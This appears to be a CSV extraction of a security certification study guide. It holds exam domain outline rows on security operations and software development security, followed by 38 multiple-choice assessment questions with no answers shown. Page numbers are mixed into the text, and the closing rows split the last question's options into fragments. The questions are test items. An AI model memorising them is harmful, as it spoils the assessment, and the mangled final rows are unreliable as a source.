Code,Text
7.4,Apply foundational security operations concepts 16
7.4.1,Need-to-know/least privilege 16
7.4.2,Segregation of Duties (SoD) and responsibilities 16
7.4.3,Privileged account management 16
7.4.4,Job rotation 16
7.4.5,Service-level agreements (SLA) 16
7.5,Apply resource protection 16
7.5.1,Media management 16
7.5.2,Media protection techniques 16
7.5.3,Data at rest/data in transit 16
7.6,Conduct incident management 17
7.6.1,Detection 17
7.6.2,Response 17
7.6.3,Mitigation 17
7.6.4,Reporting 17
7.6.5,Recovery 17
7.6.6,Remediation 17
7.6.7,Lessons learned 17
7.7,"Operate and maintain detection and preventative measures 11 , 17 , 21"
7.7.1,"Firewalls (e.g., next generation, web application, network) 11 Domain Description Chapter 26/442"
7.7.2,Intrusion detection systems (IDS) and intrusion prevention systems (IPS) 17
7.7.3,Whitelisting/blacklisting 17
7.7.4,Third-party provided security services 17
7.7.5,Sandboxing 17
7.7.6,Honeypots/honeynets 17
7.7.7,"Anti-malware 17 , 21"
7.7.8,Machine learning and Artificial Intelligence (Al) based tools 17
7.8,Implement and support patch and vulnerability management 16
7.9,Understand and participate in change management processes 16
7.10,Implement recovery strategies 18
7.10.1,"Backup storage strategies (e.g., cloud storage, onsite, offsite) 18"
7.10.2,"Recovery site strategies (e.g., cold vs. hot, resource capacity agreements) 18"
7.10.3,Multiple processing sites 18
7.10.4,"System resilience, high availability (HA), Quality of Service (QoS), and fault tolerance 18"
7.11,Implement disaster recovery (DR) processes 18
7.11.1,Response 18
7.11.2,Personnel 18
7.11.3,"Communications (e.g., methods) 18"
7.11.4,Assessment 18
7.11.5,Restoration 18
7.11.6,Training and awareness 18
7.11.7,Lessons learned 18
7.12,Test disaster recovery plan (DRP) 18
7.12.1,Read-through/tabletop 18
7.12.2,Walkthrough 18
7.12.3,Simulation 18
7.12.4,Parallel 18
7.12.5,Full interruption 18
7.12.6,"Communications (e.g., stakeholders, test status, regulators) 18"
7.13,Participate in Business Continuity (BC) planning and exercises 3
7.14,Implement and manage physical security 10
7.14.1,Perimeter security controls 10
7.14.2,Internal security controls 10
7.15,Address personnel safety and security concerns 16
7.15.1,Travel 16
7.15.2,"Security training and awareness (e.g., insider threat, social media impacts, two-factor authentication (2FA) fatigue) 16"
7.15.3,Emergency management 16
7.15.4,Duress 16
8.0,Software Development Security
8.1,Understand and integrate security in the Software Development Life Cycle (SDLC) 20
8.1.1,"Development methodologies (e.g., Agile, Waterfall, DevOps, DevSecOps, Scaled Agile Framework) 20"
8.1.2,"Maturity models (e.g., Capability Maturity Model (CMM), Software Assurance Maturity Model (SAMM)) 20"
8.1.3,Operation and maintenance 20
8.1.4,Change management 20
8.1.5,Integrated Product Team 20
8.2,"Identify and apply security controls in software development ecosystems 15 , 20 , 21"
8.2.1,Programming languages 20
8.2.2,Libraries 20
8.2.3,Tool sets 20
8.2.4,Integrated Development Environment 20
8.2.5,Runtime 20
8.2.6,Continuous Integration and Continuous Delivery (Cl/CD) 20
8.2.7,Software Configuration Management (CM) 20 Domain Description Chapter 27/442
8.2.8,Code repositories 20
8.2.9,"Application security testing (e.g., static application security testing (SAST), dynamic application security testing (DAST), software composition analysis, interactive application security testing (IAST)) 15"
8.3,"Assess the effectiveness of software security 20 , 21"
8.3.1,Auditing and logging of changes 20
8.3.2,Risk analysis and mitigation 21
8.4,"Assess security impact of acquired software 16 , 20"
8.4.1,Commercial-off-the-shelf (COTS) 20
8.4.2,Open source 20
8.4.3,Third-party 20
8.4.4,"Managed services (e.g., enterprise applications) 16"
8.4.5,"Cloud services (e.g., Software as a Service (SaaS), Infrastructure as a Service [IaaS], Platform as a Service (PaaS)) 16"
8.5,"Define and apply secure coding guidelines and standards 20 , 21"
8.5.1,Security weaknesses and vulnerabilities at the source-code level 21
8.5.2,Security of application programming interfaces (API) 20
8.5.3,Secure coding practices 20
8.5.4,"Software-defined security 20 Domain Description Chapter How to Contact the Publisher If you believe you've found a mistake in this book, please bring it to our attention. At John Wiley & Sons, we understand how important it is to provide our customers with accurate content, but even with our best efforts an error may occur. In order to submit your possible errata, please email it to our Customer Service Team at wileysupport@wiley.com with the subject line “Possible Book Errata Submission.” Assessment Test 1 . Which of the following types of access control seeks to discover evidence of unwanted, unauthorized, or illicit behavior or activity? 1 . Preventive 2 . Deterrent 3 . Detection 4 . Corrective 2 . Define and detail the aspects of password selection that distinguish good password choices from ultimately poor password choices. 1 . Is difficult to guess or unpredictable 2 . Meets minimum length requirements 3 . Meets specific complexity requirements 4 . All of the above 3 . Some adversaries use DoS attacks as their primary weapon to harm targets, whereas others may use them as weapons of last resort when all other attempts to intrude on a target fail. Which of the following is most likely to detect DoS attacks? 1 . Host-based IDS 2 . Network-based IDS 3 . Vulnerability scanner 4 . Penetration testing 4 . Unfortunately, attackers have many options of attacks to perform against their targets. Which of the following is considered a denial-of-service (DoS) attack? 1 . Pretending to be a technical manager over the phone and asking a receptionist to change their password 2 . While surfing the web, sending to a web server a malformed URL that causes the system to consume 100 percent of the CPU 3 . Intercepting network traffic by copying the packets as they pass through a specific subnet 4 . Sending message packets to a recipient who did not request them, simply to be annoying 5 . Hardware networking devices operate within the protocol stack just like protocols themselves. Thus, hardware networking devices can be associated with an OSI model layer related to the protocols they manage or control. At which layer of the OSI model does a router operate? 1 . Network Layer 2 . Layer 1 3 . Transport Layer 4 . Layer 5 6 . Which type of firewall automatically adjusts its filtering rules based on the content and context of the traffic of existing sessions? (Choose all that apply.) 1 . Static packet filtering 28/442 2 . Application-level gateway 3 . Circuit-level gateway 4 . Stateful inspection firewall 7 . A VPN can be a significant security improvement for many communication links. A VPN can be established over which of the following? 1 . Wireless LAN connection 2 . Remote access dial-up connection 3 . WAN link 4 . All of the above 8 . Adversaries will use any and all means to harm their targets. This includes mixing attack concepts together to make a more effective campaign. What type of malware uses social engineering to trick a victim into installing it? 1 . Virus 2 . Worm 3 . Trojan horse 4 . Logic bomb 9 . Security is established by understanding the assets of an organization that need protection and understanding the threats that could cause harm to those assets. Then, controls are selected that provide protection for the CIA Triad of the assets at risk. The CIA Triad consists of what elements? 1 . Contiguousness, interoperable, arranged 2 . Authentication, authorization, accountability 3 . Capable, available, integral 4 . Availability, confidentiality, integrity 10 . The security concept of AAA services describes the elements that are necessary to establish subject accountability. Which of the following is not a required component in the support of accountability? 1 . Logging 2 . Privacy 3 . Identification verification 4 . Authorization 11 . Collusion is when two or more people work together to commit a crime or violate a company policy. Which of the following is not a defense against collusion? 1 . Separation of duties 2 . Restricted job responsibilities 3 . Group shared user accounts 4 . Job rotation 12 . A data custodian is responsible for securing resources after ______________ has assigned the resource a security label. 1 . Senior management 2 . The data owner 3 . An auditor 4 . Security staff 13 . In what phase of the Capability Maturity Model for Software (SW-CMM) are quantitative measures used to gain a detailed understanding of the software development process? 1 . Repeatable 2 . Defined 3 . Managed 4 . Optimizing 14 . Which one of the following is a layer of the protection ring model design concept that is not normally implemented? 1 . Ring 0 2 . Ring 1 3 . Ring 3 4 . Ring 4 15 . TCP operates at the Transport Layer and is a connection-oriented protocol. It uses a special process to establish a session each time a communication takes place. What is the last phase of the TCP three-way handshake sequence? 1 . SYN flagged packet 2 . ACK flagged packet 3 . FIN flagged packet 4 . SYN/ACK flagged packet 16 . The lack of secure coding practices has enabled an uncountable number of software vulnerabilities that attackers have discovered and exploited. Which one of the following vulnerabilities would be best countered by adequate parameter checking? 1 . Time-of-check to time-of-use 2 . Buffer overflow 3 . SYN flood 4 . Distributed denial of service (DDoS) 17 . Computers are based on binary mathematics. All computer functions are derived from the basic set of Boolean operations. What is the value of the logical operation shown here? X: 0 1 1 0 1 0 Y: 0 0 1 1 0 1 ___________________ X ⊕ Y: ? 1 . 0 1 0 1 1 1 2 . 0 0 1 0 0 0 3 . 0 1 1 1 1 1 4 . 1 0 0 1 0 1 29/442 18 . Which of the following are considered standard data type classifications used in either a government/military or a private sector organization? (Choose all that apply.) 1 . Public 2 . Healthy 3 . Private 4 . Inside only 5 . Sensitive 6 . Proprietary 7 . Essential 8 . Certified 9 . Critical 10 . Confidential 11 . For Your Eyes Only 19 . The General Data Protection Regulation (GDPR) has defined several roles in relation to the protection and management of personally identifiable information (PII). Which of the following statements is true? 1 . A data processor is the entity assigned specific responsibility for a data asset in order to ensure its protection for use by the organization. 2 . A data custodian is the entity that performs operations on data. 3 . A data controller is the entity that makes decisions about the data they are collecting. 4 . A data owner is the entity assigned or delegated the day-to-day responsibility of proper storage and transport as well as protecting data, assets, and other organizational objects. 20 . If Renee receives a digitally signed message from Mike, what key does she use to verify that the message truly came from Mike? 1 . Renee's public key 2 . Renee's private key 3 . Mike's public key 4 . Mike's private key 21 . A systems administrator is setting up a new data management system. It will be gathering data from numerous locations across the network, even from remote offsite locations. The data will be moved to a centralized facility, where it will be stored on a massive RAID array. The data will be encrypted on the storage system using AES256, and most files will be signed as well. The location of this data warehouse is secured so that only authorized personnel can enter the room and all digital access is limited to a set of security administrators. Which of the following describes the data? 1 . The data is encrypted in transit. 2 . The data is encrypted in processing. 3 . The data is redundantly stored. 4 . The data is encrypted at rest. 22 . The __________ is the entity assigned specific responsibility for a data asset in order to ensure its protection for use by the organization. 1 . Data owner 2 . Data controller 3 . Data processor 4 . Data custodian 23 . A security auditor is seeking evidence of how sensitive documents made their way out of the organization and onto a public document distribution site. It is suspected that an insider exfiltrated the data over a network connection to an external server, but this is only a guess. Which of the following would be useful in determining whether this suspicion is accurate? (Choose two.) 1 ."
"NAC
2",". DLP alerts 3 . Syslog 4 . Log analysis 5 . Malware scanner reports 6 . Integrity monitoring 24 . A new Wireless Access Point (WAP) is being installed to add wireless connectivity to the company network. The configuration policy indicates that WPA3 is to be used and thus only newer or updated endpoint devices can connect. The policy also states that ENT authentication will not be implemented. What authentication mechanism can be implemented in this situation? 1 . IEEE 802.1X 2 . IEEE 802.1q 3 . Simultaneous authentication of equals (SAE) 4 . EAP-FAST 25 . When securing a mobile device, what types of authentication can be used that depend on the user's physical attributes? (Choose all that apply.) 1 . Fingerprint 2 . TOTP (time-based one-time password) 3 . Voice 4 . SMS (short message service) 5 . Retina or iris 6 . Gait 7 . Phone call 8 . Facial recognition 9 . Smartcard 10 . Password 26 . A recently acquired piece of equipment is not working properly. Your organization does not have a trained repair technician on staff, so you have to bring in an outside expert. What type of account should be issued to a trusted third-party repair technician? 1 . Guest account 30/442 2 . Privileged account 3 . Service account 4 . User account 27 . Security should be designed and integrated into the organization as a means to support and maintain the business objectives. However, the only way to know if the implemented security is sufficient is to test it. Which of the following is a procedure designed to test and perhaps bypass a system's security controls? 1 . Logging usage data 2 . War dialing 3 . Penetration testing 4 . Deploying secured desktop workstations 28 . Security needs to be designed to support the business objectives, but it also needs to be legally defensible. To defend the security of an organization, a log of events and activities must be created. Auditing is a required factor to sustain and enforce what? 1 . Accountability 2 . Confidentiality 3 . Accessibility 4 . Redundancy 29 . Risk assessment is a process by which the assets, threats, probabilities, and likelihoods are evaluated in order to establish criticality prioritization. What is the formula used to compute the ALE? 1 . ALE = AV * EF * ARO 2 . ALE = ARO * EF 3 . ALE = AV * ARO 4 . ALE = EF * ARO 30 . Incident response plans, business continuity plans, and disaster recovery plans are crafted when implementing business-level redundancy. These plans are derived from the information obtained when performing a business impact assessment (BIA). What is the first step of the BIA process? 1 . Identification of priorities 2 . Likelihood assessment 3 . Risk identification 4 . Resource prioritization 31 . Many events can threaten the operation, existence, and stability of an organization. Some of those threats are human caused, whereas others are from natural events. Which of the following represent natural events that can pose a threat or risk to an organization? 1 . Earthquake 2 . Flood 3 . Tornado 4 . All of the above 32 . What kind of recovery facility enables an organization to resume operations as quickly as possible, if not immediately, upon failure of the primary facility? 1 . Hot site 2 . Warm site 3 . Cold site 4 . All of the above 33 . During an account review, an auditor provided the following report: User Last Login Length Last Password Change Bob 4 hours 87 days Sue 3 hours 38 days John 1 hour 935 days Kesha 3 hours 49 days The security manager reviews the account policies of the organization and takes note of the following requirements: Passwords must be at least 12 characters long. Passwords must include at least one example of three different character types. Passwords must be changed every 180 days. Passwords cannot be reused. Which of the following security controls should be corrected to enforce the password policy? 1 . Minimum password length 2 . Account lockout 3 . Password history and minimum age 4 . Password maximum age 34 . Any evidence to be used in a court proceeding must abide by the Rules of Evidence to be admissible. What type of evidence refers to written documents that are brought into court to prove a fact? 1 . Best evidence 2 . Parol evidence 3 . Documentary evidence 4 . Testimonial evidence 35 . DevOps manager John is concerned with the CEO's plan to minimize his department and outsource code development to a foreign programming group. John has a meeting scheduled with the board of directors to encourage them to retain code development in house due to several concerns. Which of the following should John include in his presentation? (Choose all that apply.) 1 . Code from third parties will need to be manually reviewed for function and security. 31/442 2 . If the third party goes out of business, existing code may need to be abandoned. 3 . Third-party code development is always more expensive. 4 . A software escrow agreement should be established. 36 . When TLS is being used to secure web communications, what URL prefix appears in the web browser address bar to signal this fact? 1 . SHTTP:// 2 . TLS:// 3 . FTPS:// 4 . HTTPS:// 37 . A new update has been released by the vendor of an important software product that is an essential element of a critical business task. The chief security officer (CSO) indicates that the new software version needs to be tested and evaluated in a virtual lab, which has a cloned simulation of many of the company's production systems. Furthermore, the results of this evaluation must be reviewed before a decision is made as to whether the software update should be installed and, if so, when to install it. What security principle is the CSO demonstrating? 1 . Business continuity planning (BCP) 2 . Onboarding 3 . Change management 4 . Static analysis 38 . What type of token device produces new time-derived passwords on a specific time interval that can be used only a single time when attempting to authenticate? 1 ."
"HOTP
2",.
"HMAC
3",.
"SAML
4",.
